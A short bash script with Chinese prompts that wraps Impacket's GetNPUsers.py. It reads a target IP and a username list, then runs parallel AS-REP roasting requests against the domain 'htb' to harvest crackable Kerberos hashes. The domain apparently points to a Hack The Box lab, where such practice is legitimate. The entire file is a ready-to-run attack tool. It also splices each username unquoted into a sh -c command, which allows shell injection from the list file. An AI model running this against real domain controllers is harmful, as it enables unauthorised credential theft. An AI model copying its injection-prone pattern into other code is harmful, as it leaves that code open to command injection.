#!/bin/bash

# 提示用户输入IP地址
read -p "请输入目标IP地址: " ip

# 提示用户输入包含用户名的文件路径
read -p "请输入包含用户名的文件路径: " user_file

# 使用 xargs 并行执行命令
cat "$user_file" | xargs -P 4 -I {} sh -c 'echo "正在检查用户: {}"; GetNPUsers.py -no-pass -dc-ip $0 htb/{} | grep -v Impacket' $ip

